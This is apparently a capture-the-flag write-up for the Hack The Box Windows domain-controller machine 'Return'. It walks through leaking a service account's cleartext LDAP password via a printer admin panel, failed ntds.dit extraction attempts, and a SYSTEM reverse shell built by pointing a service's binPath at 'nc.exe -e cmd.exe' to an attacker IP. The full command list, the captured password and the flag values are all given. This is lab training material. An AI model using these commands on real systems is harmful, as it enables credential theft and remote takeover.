# HTB Return — Full Writeup

**Difficulty:** Easy | **OS:** Windows / Active Directory | **Domain:** `return.local` | **Hostname:** `PRINTER`

---

## Synopsis

Return is an easy Windows AD box centered on a network printer administration web panel that stores LDAP service-account credentials. The panel lets an attacker redirect the configured LDAP server address to an attacker-controlled host; a backend service periodically uses the stored (cleartext) credentials to authenticate to that address, leaking them via a captured LDAP simple bind. The resulting service account is a member of the built-in **Server Operators** group, which grants rights to reconfigure and control Windows services — abused to get a SYSTEM shell.

---

## Recon

### Nmap

```
nmap -p- --min-rate=1000 -sV -sC 10.129.95.241
```

Key findings:
- Full Domain Controller stack: Kerberos (88), LDAP (389/3268), SMB (445), RPC, `kpasswd` (464)
- Domain: `return.local`, hostname `PRINTER`
- Port 80 (IIS 10.0): **"HTB Printer Admin Panel"**
- Port 5985: WinRM open — likely foothold delivery method once creds are obtained
- SMB signing enabled and required (rules out NTLM relay against SMB directly)

### Web enumeration

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://return.local/FUZZ -e .php,.txt,.js,.html
```

Found `index.php` and `settings.php`. The settings page displays an LDAP connection configuration form:

| Field | Value |
|---|---|
| Server Address | `printer.return.local` |
| Server Port | `389` |
| Username | `svc-printer` |
| Password | `*******` (masked) |

Viewing the raw HTML source revealed only the **Server Address** input has a `name` attribute (`name="ip"`) — the port/username/password fields are unnamed and therefore never submitted in a POST. The password field's literal asterisks in source (vs. dot-masking in the rendered DOM) confirmed the real value is never sent to the browser at all — not retrievable client-side.

The page renders the exact same default values regardless of GET or POST — this is a static/cosmetic template; it does **not** reflect stored backend state. This caused early confusion (looked like the update "failed"), but the POST is still processed server-side independently of what's displayed back.

---

## Vulnerability / Root Cause

This is the classic "network printer admin panel" credential-leak pattern seen on real enterprise MFC devices (Canon/Xerox/Epson-style management UIs): the panel stores LDAP/SMB service credentials so the printer can query the AD user list or save scans to a network share. A backend Windows service/scheduled task polls this stored config on an interval and attempts to authenticate to whatever LDAP server address is configured — using the cached **cleartext** credentials (LDAP simple bind sends username/password in plaintext).

Because the **Server Address field is attacker-controllable** and the panel doesn't validate that the address belongs to the real domain, redirecting it to an attacker-controlled host causes the backend service to leak `svc-printer`'s cleartext password directly to the attacker.

---

## Exploitation — Foothold

1. Start a credential-capture listener on Kali (Responder handles LDAP automatically):
   ```
   sudo responder -I tun0
   ```
2. Trigger the backend to point its LDAP test connection at the attacker IP by POSTing the `ip` field directly (bypassing the cosmetic front-end):
   ```
   curl -d "ip=10.10.14.225" http://return.local/settings.php
   ```
3. Within moments, Responder captures the cleartext authentication attempt:
   ```
   [LDAP] Cleartext Client   : 10.129.95.241
   [LDAP] Cleartext Username : return\svc-printer
   [LDAP] Cleartext Password : 1edFg43012!!
   ```
   (Confirmed reproducible — re-running the curl command re-triggers the leak.)

4. Validate creds and enumerate access:
   ```
   netexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' --shares
   ```
   Notably returned **READ,WRITE on C$** — an unusual level of access for a standard domain user, foreshadowing the privileged group membership found next.

5. Enumerate group membership:
   ```
   netexec ldap 10.129.95.241 -u svc-printer -p '1edFg43012!!' --groups
   net rpc group members "Server Operators" -U return.local/svc-printer%'1edFg43012!!' -S 10.129.95.241
   ```
   Confirmed `svc-printer` is the sole member of **Server Operators**.

6. Foothold via WinRM:
   ```
   evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
   ```
   User flag retrieved from `C:\Users\svc-printer\Desktop\user.txt`.

---

## Privilege Escalation

### Dead-end detour (educational): SeBackupPrivilege / ntds.dit

`whoami /all` showed `SeBackupPrivilege` and `SeRestorePrivilege` enabled on the token, suggesting a classic Blackfield-style NTDS extraction. This path was explored but does **not** work for this account/box — documented here because the failure modes are instructive:

- `reg save hklm\sam` / `reg save hklm\system` succeed, but on a Domain Controller the local SAM only contains the special **DSRM** recovery account, not the real domain Administrator — a dead end for domain hash extraction.
- `diskshadow` VSS shadow-copy approach (`set context persistent nowriters` / `add volume c: alias mydrive` / `create` / `expose %mydrive% z:` / `exit`) failed twice:
  - First attempt: PowerShell's `>`/`>>` redirection writes UTF-16; `diskshadow` requires plain ASCII and silently failed to parse the script. Fixed with `Out-File -Encoding ascii`.
  - Second attempt: `COM call "(*vssObject)->InitializeForBackup" failed` — VSS's backup API performs a **hardcoded membership check** for `Administrators`/`Backup Operators`, completely separate from whether `SeBackupPrivilege` is enabled on the token. `Server Operators` does not satisfy this check, no matter the raw privilege state. Starting the (stopped) `VSS` service did not help, since this is a group-membership gate, not a service-availability issue.
- `robocopy /b C:\Windows\NTDS C:\Temp ntds.dit` failed with `ERROR 32` (sharing violation) — `/B` backup mode bypasses ACL checks via `SeBackupPrivilege` but does **not** bypass the OS-level exclusive lock held by the NTDS/lsass process on a live file.
- Correct tool for this path would have been `SeBackupPrivilegeCmdLets` (giuliano108), which uses the `BackupRead()` Win32 API directly to read locked files under the raw privilege without needing VSS or specific group membership — not needed here since the actual intended path was simpler.

### Actual intended path: Server Operators service abuse

Per the official HTB documentation (MrR3boot, doc D21.101.183): members of **Server Operators** hold a Windows *service-control* ACL — distinct from VSS's internal COM-level group check — granting rights to reconfigure (`sc.exe config`) and start/stop any system service. Abused directly against the (ironically) `vss` service itself:

```powershell
# Upload netcat to the target
upload /usr/share/windows-resources/binaries/nc.exe C:\Temp\nc.exe

# Point the vss service's binary at a netcat reverse shell
sc.exe config vss binPath="C:\Temp\nc.exe -e cmd.exe 10.10.14.225 1234"

# A running service won't reload its binPath without a stop/start cycle
sc.exe stop vss
sc.exe start vss
```

On Kali, with a listener already up:
```
rlwrap nc -lvnp 1234
```

`sc.exe start vss` returns `[SC] StartService FAILED 1053` — expected and harmless; netcat never sends the Service Control Manager its expected "service started" signal, but the shell connects back before that timeout matters. Confirmed `nt authority\system` on the resulting shell.

Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.

---

## Full Command List (chronological)

```
nmap -p- --min-rate=1000 -sV -sC 10.129.95.241
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://return.local/FUZZ -e .php,.txt,.js,.html
curl -d "ip=10.10.14.225" http://return.local/settings.php
sudo responder -I tun0
netexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' --shares
netexec ldap 10.129.95.241 -u svc-printer -p '1edFg43012!!' --gmsa
netexec ldap 10.129.95.241 -u svc-printer -p '1edFg43012!!' --asreproast aspusr.txt
netexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' --users
netexec ldap 10.129.95.241 -u svc-printer -p '1edFg43012!!' --groups
net rpc group members "Server Operators" -U return.local/svc-printer%'1edFg43012!!' -S 10.129.95.241
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
type user.txt
whoami /all
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
mkdir C:\Temp
"set context persistent nowriters" | Out-File -Encoding ascii C:\Temp\diskshadow.txt
"add volume c: alias mydrive" | Out-File -Encoding ascii -Append C:\Temp\diskshadow.txt
"create" | Out-File -Encoding ascii -Append C:\Temp\diskshadow.txt
"expose %mydrive% z:" | Out-File -Encoding ascii -Append C:\Temp\diskshadow.txt
"exit" | Out-File -Encoding ascii -Append C:\Temp\diskshadow.txt
diskshadow /s C:\Temp\diskshadow.txt
Get-Service VSS
Start-Service VSS
robocopy /b C:\Windows\NTDS C:\Temp ntds.dit
robocopy /b C:\Windows\System32\config C:\Temp SYSTEM
upload /usr/share/windows-resources/binaries/nc.exe C:\Temp\nc.exe
sc.exe config vss binPath="C:\Temp\nc.exe -e cmd.exe 10.10.14.225 1234"
sc.exe stop vss
sc.exe start vss
rlwrap nc -lvnp 1234
type C:\Users\Administrator\Desktop\root.txt
```

---

## Credentials Found

| Account | Password | Source |
|---|---|---|
| `return\svc-printer` | `1edFg43012!!` | LDAP cleartext simple-bind capture via Responder, triggered by redirecting the printer panel's stored LDAP server address to an attacker-controlled host |

---

## Flags

| Flag | Value |
|---|---|
| `user.txt` | `c9b4b7016082b1318eb6d7c066e0e992` |
| `root.txt` | `933d42c0e7175da3288924b6a16eaea9` |

---

## Key Takeaways

- Printer/MFC admin panels storing LDAP/SMB credentials are a recurring real-world credential-leak vector — always worth testing if the "server address" field is attacker-controllable.
- `SeBackupPrivilege` alone does not defeat VSS's internal Administrators/Backup Operators group check, nor does it bypass OS-level exclusive file locks via `robocopy /B` — `BackupRead()`-based tools (`SeBackupPrivilegeCmdLets`) are the correct tool when raw privilege is present but group membership/file locks block the simpler paths.
- On a Domain Controller, the local SAM hive only yields the DSRM recovery account — not the real domain Administrator. Domain hash extraction requires `ntds.dit`.
- **Server Operators** group membership grants service-control rights (reconfigure/start/stop) independent of VSS-specific or file-ACL-specific permission checks — a clean, reliable SYSTEM privesc when present.
- PowerShell's default redirection (`>`/`>>`) writes UTF-16; tools expecting plain ASCII scripts (like `diskshadow`) will silently fail to parse — use `Out-File -Encoding ascii`.
